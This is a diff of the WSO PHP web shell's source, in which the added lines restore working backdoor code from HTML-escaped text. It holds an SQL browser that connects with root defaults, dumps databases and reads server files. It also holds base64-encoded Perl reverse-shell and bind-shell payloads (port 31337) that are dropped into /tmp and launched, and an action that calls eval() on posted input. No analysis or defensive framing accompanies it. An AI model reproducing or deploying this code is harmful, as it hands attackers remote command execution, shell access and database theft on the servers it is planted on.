-&lt;input type=hidden name=a value=Sql&gt;&lt;input type=hidden name=p1 value='query'&gt;&lt;input type=hidden name=p2 value=''&gt;&lt;input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'&gt;&lt;input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'&gt;
-&lt;td&gt;&lt;select name='type'&gt;&lt;option value='mysql' ";
+<h1>Sql browser</h1><div class=content>
+<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>
+<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>
+<input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'><input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>
+<td><select name='type'><option value='mysql' ";
                                                                     if (@$_POST['type'] == 'mysql') echo 'selected';
-                                                                    echo "&gt;MySql&lt;/option&gt;&lt;option value='pgsql' ";
+                                                                    echo ">MySql</option><option value='pgsql' ";
                                                                     if (@$_POST['type'] == 'pgsql') echo 'selected';
-                                                                    echo "&gt;PostgreSql&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;
-&lt;td&gt;&lt;input type=text name=sql_host value='" . (empty($_POST['sql_host']) ? 'localhost' : htmlspecialchars($_POST['sql_host'])) . "'&gt;&lt;/td&gt;
-&lt;td&gt;&lt;input type=text name=sql_login value='" . (empty($_POST['sql_login']) ? 'root' : htmlspecialchars($_POST['sql_login'])) . "'&gt;&lt;/td&gt;
-&lt;td&gt;&lt;input type=text name=sql_pass value='" . (empty($_POST['sql_pass']) ? '' : htmlspecialchars($_POST['sql_pass'])) . "'&gt;&lt;/td&gt;&lt;td&gt;";
-                                                                    $tmp = "&lt;input type=text name=sql_base value=''&gt;";
+                                                                    echo ">PostgreSql</option></select></td>
+<td><input type=text name=sql_host value='" . (empty($_POST['sql_host']) ? 'localhost' : htmlspecialchars($_POST['sql_host'])) . "'></td>
+<td><input type=text name=sql_login value='" . (empty($_POST['sql_login']) ? 'root' : htmlspecialchars($_POST['sql_login'])) . "'></td>
+<td><input type=text name=sql_pass value='" . (empty($_POST['sql_pass']) ? '' : htmlspecialchars($_POST['sql_pass'])) . "'></td><td>";
+                                                                    $tmp = "<input type=text name=sql_base value=''>";
                                                                     if (isset($_POST['sql_host'])) {
-                                                                        if ($db-&gt;connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
+                                                                        if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
                                                                             switch ($_POST['charset']) {
                                                                                 case "Windows-1251":
-                                                                                    $db-&gt;setCharset('cp1251');
+                                                                                    $db->setCharset('cp1251');
                                                                                 break;
                                                                                 case "UTF-8":
-                                                                                    $db-&gt;setCharset('utf8');
+                                                                                    $db->setCharset('utf8');
                                                                                 break;
                                                                                 case "KOI8-R":
-                                                                                    $db-&gt;setCharset('koi8r');
+                                                                                    $db->setCharset('koi8r');
                                                                                 break;
                                                                                 case "KOI8-U":
-                                                                                    $db-&gt;setCharset('koi8u');
+                                                                                    $db->setCharset('koi8u');
                                                                                 break;
                                                                                 case "cp866":
-                                                                                    $db-&gt;setCharset('cp866');
+                                                                                    $db->setCharset('cp866');
                                                                                 break;
                                                                             }
-                                                                            $db-&gt;listDbs();
-                                                                            echo "&lt;select name=sql_base&gt;&lt;option value=''&gt;&lt;/option&gt;";
-                                                                            while ($item = $db-&gt;fetch()) {
+                                                                            $db->listDbs();
+                                                                            echo "<select name=sql_base><option value=''></option>";
+                                                                            while ($item = $db->fetch()) {
                                                                                 list($key, $value) = each($item);
-                                                                                echo '&lt;option value="' . $value . '" ' . ($value == $_POST['sql_base'] ? 'selected' : '') . '&gt;' . $value . '&lt;/option&gt;';
+                                                                                echo '<option value="' . $value . '" ' . ($value == $_POST['sql_base'] ? 'selected' : '') . '>' . $value . '</option>';
                                                                             }
-                                                                            echo '&lt;/select&gt;';
+                                                                            echo '</select>';
                                                                         } else echo $tmp;
                                                                     } else echo $tmp;
-                                                                    echo "&lt;/td&gt;
-				&lt;td&gt;&lt;input type=submit value='&gt;&gt;' onclick='fs(d.sf);'&gt;&lt;/td&gt;
-                &lt;td&gt;&lt;input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count']) ? '' : ' checked') . "&gt; count the number of rows&lt;/td&gt;
-			&lt;/tr&gt;
-		&lt;/table&gt;
-		&lt;script&gt;
+                                                                    echo "</td>
+				<td><input type=submit value='>>' onclick='fs(d.sf);'></td>
+                <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count']) ? '' : ' checked') . "> count the number of rows</td>
+			</tr>
+		</table>
+		<script>
             s_db='" . @addslashes($_POST['sql_base']) . "';
             function fs(f) {
                 if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
@@ -1288,99 +1288,99 @@ function add(cmd) {
 				d.sf.submit();
 			}
 			function is() {
-				for(i=0;i&lt;d.sf.elements['tbl[]'].length;++i)
+				for(i=0;i<d.sf.elements['tbl[]'].length;++i)
 					d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
 			}
-		&lt;/script&gt;";
-                                                                    if (isset($db) && $db-&gt;link) {
-                                                                        echo "&lt;br/&gt;&lt;table width=100% cellpadding=2 cellspacing=0&gt;";
+		</script>";
+                                                                    if (isset($db) && $db->link) {
+                                                                        echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
                                                                         if (!empty($_POST['sql_base'])) {
-                                                                            $db-&gt;selectdb($_POST['sql_base']);
-                                                                            echo "&lt;tr&gt;&lt;td width=1 style='border-top:2px solid #666;'&gt;&lt;span&gt;Tables:&lt;/span&gt;&lt;br&gt;&lt;br&gt;";
-                                                                            $tbls_res = $db-&gt;listTables();
-                                                                            while ($item = $db-&gt;fetch($tbls_res)) {
+                                                                            $db->selectdb($_POST['sql_base']);
+                                                                            echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
+                                                                            $tbls_res = $db->listTables();
+                                                                            while ($item = $db->fetch($tbls_res)) {
                                                                                 list($key, $value) = each($item);
-                                                                                if (!empty($_POST['sql_count'])) $n = $db-&gt;fetch($db-&gt;query('SELECT COUNT(*) as n FROM ' . $value . ''));
+                                                                                if (!empty($_POST['sql_count'])) $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM ' . $value . ''));
                                                                                 $value = htmlspecialchars($value);
-                                                                                echo "&lt;nobr&gt;&lt;input type='checkbox' name='tbl[]' value='" . $value . "'&gt;&nbsp;&lt;a href=# onclick=\"st('" . $value . "',1)\"&gt;" . $value . "&lt;/a&gt;" . (empty($_POST['sql_count']) ? '&nbsp;' : " &lt;small&gt;({$n['n']})&lt;/small&gt;") . "&lt;/nobr&gt;&lt;br&gt;";
+                                                                                echo "<nobr><input type='checkbox' name='tbl[]' value='" . $value . "'>&nbsp;<a href=# onclick=\"st('" . $value . "',1)\">" . $value . "</a>" . (empty($_POST['sql_count']) ? '&nbsp;' : " <small>({$n['n']})</small>") . "</nobr><br>";
                                                                             }
-                                                                            echo "&lt;input type='checkbox' onclick='is();'&gt; &lt;input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'&gt;&lt;br&gt;File path:&lt;input type=text name=file value='dump.sql'&gt;&lt;/td&gt;&lt;td style='border-top:2px solid #666;'&gt;";
+                                                                            echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
                                                                             if (@$_POST['p1'] == 'select') {
                                                                                 $_POST['p1'] = 'query';
                                                                                 $_POST['p3'] = $_POST['p3'] ? $_POST['p3'] : 1;
-                                                                                $db-&gt;query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
-                                                                                $num = $db-&gt;fetch();
+                                                                                $db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
+                                                                                $num = $db->fetch();
                                                                                 $pages = ceil($num['n'] / 30);
-                                                                                echo "&lt;script&gt;d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}&lt;/script&gt;&lt;span&gt;" . $_POST['p2'] . "&lt;/span&gt; ({$num['n']} records) Page # &lt;input type=text name='p3' value=" . ((int)$_POST['p3']) . "&gt;";
+                                                                                echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>" . $_POST['p2'] . "</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">";
                                                                                 echo " of $pages";
-                                                                                if ($_POST['p3'] &gt; 1) echo " &lt;a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] - 1) . ")'&gt;&lt; Prev&lt;/a&gt;";
-                                                                                if ($_POST['p3'] &lt; $pages) echo " &lt;a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] + 1) . ")'&gt;Next &gt;&lt;/a&gt;";
+                                                                                if ($_POST['p3'] > 1) echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] - 1) . ")'>< Prev</a>";
+                                                                                if ($_POST['p3'] < $pages) echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] + 1) . ")'>Next ></a>";
                                                                                 $_POST['p3']--;
                                                                                 if ($_POST['type'] == 'pgsql') $_POST['p2'] = 'SELECT * FROM ' . $_POST['p2'] . ' LIMIT 30 OFFSET ' . ($_POST['p3'] * 30);
                                                                                 else $_POST['p2'] = 'SELECT * FROM `' . $_POST['p2'] . '` LIMIT ' . ($_POST['p3'] * 30) . ',30';
-                                                                                echo "&lt;br&gt;&lt;br&gt;";
+                                                                                echo "<br><br>";
                                                                             }
                                                                             if ((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
-                                                                                $db-&gt;query(@$_POST['p2']);
-                                                                                if ($db-&gt;res !== false) {
+                                                                                $db->query(@$_POST['p2']);
+                                                                                if ($db->res !== false) {
                                                                                     $title = false;
-                                                                                    echo '&lt;table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929"&gt;';
+                                                                                    echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">';
                                                                                     $line = 1;
-                                                                                    while ($item = $db-&gt;fetch()) {
+                                                                                    while ($item = $db->fetch()) {
                                                                                         if (!$title) {
-                                                                                            echo '&lt;tr&gt;';
-                                                                                            foreach ($item as $key =&gt; $value) echo '&lt;th&gt;' . $key . '&lt;/th&gt;';
+                                                                                            echo '<tr>';
+                                                                                            foreach ($item as $key => $value) echo '<th>' . $key . '</th>';
                                                                                             reset($item);
                                                                                             $title = true;
-                                                                                            echo '&lt;/tr&gt;&lt;tr&gt;';
+                                                                                            echo '</tr><tr>';
                                                                                             $line = 2;
                                                                                         }
-                                                                                        echo '&lt;tr class="l' . $line . '"&gt;';
+                                                                                        echo '<tr class="l' . $line . '">';
                                                                                         $line = $line == 1 ? 2 : 1;
-                                                                                        foreach ($item as $key =&gt; $value) {
-                                                                                            if ($value == null) echo '&lt;td&gt;&lt;i&gt;null&lt;/i&gt;&lt;/td&gt;';
-                                                                                            else echo '&lt;td&gt;' . nl2br(htmlspecialchars($value)) . '&lt;/td&gt;';
+                                                                                        foreach ($item as $key => $value) {
+                                                                                            if ($value == null) echo '<td><i>null</i></td>';
+                                                                                            else echo '<td>' . nl2br(htmlspecialchars($value)) . '</td>';
                                                                                         }
-                                                                                        echo '&lt;/tr&gt;';
+                                                                                        echo '</tr>';
                                                                                     }
-                                                                                    echo '&lt;/table&gt;';
+                                                                                    echo '</table>';
                                                                                 } else {
-                                                                                    echo '&lt;div&gt;&lt;b&gt;Error:&lt;/b&gt; ' . htmlspecialchars($db-&gt;error()) . '&lt;/div&gt;';
+                                                                                    echo '<div><b>Error:</b> ' . htmlspecialchars($db->error()) . '</div>';
                                                                                 }
                                                                             }
-                                                                            echo "&lt;br&gt;&lt;/form&gt;&lt;form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'&gt;&lt;textarea name='query' style='width:100%;height:100px'&gt;";
+                                                                            echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";
                                                                             if (!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile')) echo htmlspecialchars($_POST['p2']);
-                                                                            echo "&lt;/textarea&gt;&lt;br/&gt;&lt;input type=submit value='Execute'&gt;";
-                                                                            echo "&lt;/td&gt;&lt;/tr&gt;";
+                                                                            echo "</textarea><br/><input type=submit value='Execute'>";
+                                                                            echo "</td></tr>";
                                                                         }
-                                                                        echo "&lt;/table&gt;&lt;/form&gt;&lt;br/&gt;";
+                                                                        echo "</table></form><br/>";
                                                                         if ($_POST['type'] == 'mysql') {
-                                                                            $db-&gt;query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
-                                                                            if ($db-&gt;fetch()) echo "&lt;form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'&gt;&lt;span&gt;Load file&lt;/span&gt; &lt;input  class='toolsInp' type=text name=f&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;";
+                                                                            $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
+                                                                            if ($db->fetch()) echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
                                                                         }
                                                                         if (@$_POST['p1'] == 'loadfile') {
-                                                                            $file = $db-&gt;loadFile($_POST['p2']);
-                                                                            echo '&lt;pre class=ml1&gt;' . htmlspecialchars($file['file']) . '&lt;/pre&gt;';
+                                                                            $file = $db->loadFile($_POST['p2']);
+                                                                            echo '<pre class=ml1>' . htmlspecialchars($file['file']) . '</pre>';
                                                                         }
                                                                     } else {
-                                                                        echo htmlspecialchars($db-&gt;error());
+                                                                        echo htmlspecialchars($db->error());
                                                                     }
-                                                                    echo '&lt;/div&gt;';
+                                                                    echo '</div>';
                                                                     wsoFooter();
                                                                 }
                                                                 function actionNetwork() {
                                                                     wsoHeader();
                                                                     $back_connect_p = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
                                                                     $bind_port_p = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
-                                                                    echo "&lt;h1&gt;Network tools&lt;/h1&gt;&lt;div class=content&gt;
-	&lt;form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\"&gt;
-	&lt;span&gt;Bind port to /bin/sh 1&lt;/span&gt;&lt;br/&gt;
-	Port: &lt;input type='text' name='port' value='31337'&gt; &lt;input type=submit value='&gt;&gt;'&gt;
-	&lt;/form&gt;
-	&lt;form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\"&gt;
-	&lt;span&gt;Back-connect  1&lt;/span&gt;&lt;br/&gt;
-	Server: &lt;input type='text' name='server' value='" . $_SERVER['REMOTE_ADDR'] . "'&gt; Port: &lt;input type='text' name='port' value='31337'&gt; &lt;input type=submit value='&gt;&gt;'&gt;
-	&lt;/form&gt;&lt;br&gt;";
+                                                                    echo "<h1>Network tools</h1><div class=content>
+	<form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">
+	<span>Bind port to /bin/sh 1</span><br/>
+	Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
+	</form>
+	<form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">
+	<span>Back-connect  1</span><br/>
+	Server: <input type='text' name='server' value='" . $_SERVER['REMOTE_ADDR'] . "'> Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
+	</form><br>";
                                                                     if (isset($_POST['p1'])) {
                                                                         function cf($f, $t) {
                                                                             $w = @fopen($f, "w") or @function_exists('file_put_contents');
@@ -1391,25 +1391,25 @@ function add(cmd) {
                                                                         }
                                                                         if ($_POST['p1'] == 'bpp') {
                                                                             cf("/tmp/bp.pl", $bind_port_p);
-                                                                            $out = wsoEx("perl /tmp/bp.pl " . $_POST['p2'] . " 1&gt;/dev/null 2&gt;&1 &");
-                                                                            echo "&lt;pre class=ml1&gt;$out
-" . wsoEx("ps aux | grep bp.pl") . "&lt;/pre&gt;";
+                                                                            $out = wsoEx("perl /tmp/bp.pl " . $_POST['p2'] . " 1>/dev/null 2>&1 &");
+                                                                            echo "<pre class=ml1>$out
+" . wsoEx("ps aux | grep bp.pl") . "</pre>";
                                                                             unlink("/tmp/bp.pl");
                                                                         }
                                                                         if ($_POST['p1'] == 'bcp') {
                                                                             cf("/tmp/bc.pl", $back_connect_p);
-                                                                            $out = wsoEx("perl /tmp/bc.pl " . $_POST['p2'] . " " . $_POST['p3'] . " 1&gt;/dev/null 2&gt;&1 &");
-                                                                            echo "&lt;pre class=ml1&gt;$out
-" . wsoEx("ps aux | grep bc.pl") . "&lt;/pre&gt;";
+                                                                            $out = wsoEx("perl /tmp/bc.pl " . $_POST['p2'] . " " . $_POST['p3'] . " 1>/dev/null 2>&1 &");
+                                                                            echo "<pre class=ml1>$out
+" . wsoEx("ps aux | grep bc.pl") . "</pre>";
                                                                             unlink("/tmp/bc.pl");
                                                                         }
                                                                     }
-                                                                    echo '&lt;/div&gt;';
+                                                                    echo '</div>';
                                                                     wsoFooter();
                                                                 }
                                                                 function actionRC() {
                                                                     if (!@$_POST['p1']) {
-                                                                        $a = array("uname" =&gt; php_uname(), "php_version" =&gt; phpversion(), "wso_version" =&gt; WSO_VERSION, "safemode" =&gt; @ini_get('safe_mode'));
+                                                                        $a = array("uname" => php_uname(), "php_version" => phpversion(), "wso_version" => WSO_VERSION, "safemode" => @ini_get('safe_mode'));
                                                                         echo serialize($a);
                                                                     } else {
                                                                         eval($_POST['p1']);
